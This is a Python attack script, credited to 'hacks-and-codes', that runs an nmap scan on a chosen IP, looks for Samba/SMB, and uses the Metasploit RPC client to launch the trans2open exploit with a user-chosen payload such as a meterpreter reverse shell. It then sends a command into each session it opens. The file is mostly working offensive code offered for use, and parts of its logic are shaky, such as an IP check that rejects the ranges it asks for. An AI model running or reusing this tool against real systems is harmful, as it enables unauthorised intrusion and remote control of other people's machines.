#!/bin/python
import nmap
from pymetasploit3 import msfrpc
import os
import pyfiglet
import re
import logging

# Initialize Metasploit client
client = msfrpc.MsfRpcClient('mypasswd', port=555, ssl=False)

# Set up logging
logging.basicConfig(filename='script_log.txt', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# ASCII art and regular expressions
author = "### Author: hacks-and-codes ###"
print(pyfiglet.figlet_format(author, "starwars").format())
samba_search = "^(samba)|(smb)|(port 139)"
regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"

def get_ip_input():
    while True:
        ip_address = input('Enter IP or range to scan (e.g., 192.168.1.1 or 192.168.1.0/24): ')
        if re.search(regex, ip_address):
            return ip_address
        else:
            print("Invalid IP address or range. Please try again.")

def check(ip_address):
    try:
        data = nmap.PortScanner()
        data.scan(ip_address, '-p-', '-A -T4', True)
        logging.info(f"Nmap scan performed on: {ip_address}")
        return data
    except Exception as e:
        logging.error(f"An error occurred: {str(e)}")
        print("An error has occurred!\nPlease check your network")

def customize_payload():
    payload = input("Enter the payload to use (e.g., linux/x86/meterpreter/reverse_tcp): ")
    options = {}
    while True:
        option_name = input("Enter an option name (or press Enter to finish customization): ")
        if not option_name:
            break
        option_value = input(f"Enter the value for option '{option_name}': ")
        options[option_name] = option_value
    return payload, options

def main():
    ip_address = get_ip_input()
    data = check(ip_address)
    if data:
        for target in data.all_hosts():
            smb = data[target]['scaninfo']
            if re.search(samba_search, str(smb)):
                print(f"Samba found on {target}!")
                logging.info(f"Samba vulnerability detected on {target}.")

                payload, options = customize_payload()
                exploit = client.modules.use('exploit', 'exploit/linux/x86/trans2open')
                exploit.execute(payload=payload, options=options)
                sessions = exploit.sessions.list
                for session_id in sessions:
                    session = exploit.sessions.get(session_id)
                    session.shell_write("command to execute\n")
                    response = session.shell_read()
                    print(response)

            else:
                print(f"SMB not found on {target}!")
                logging.info(f"Samba vulnerability not detected on {target}.")

if __name__ == "__main__":
    main()
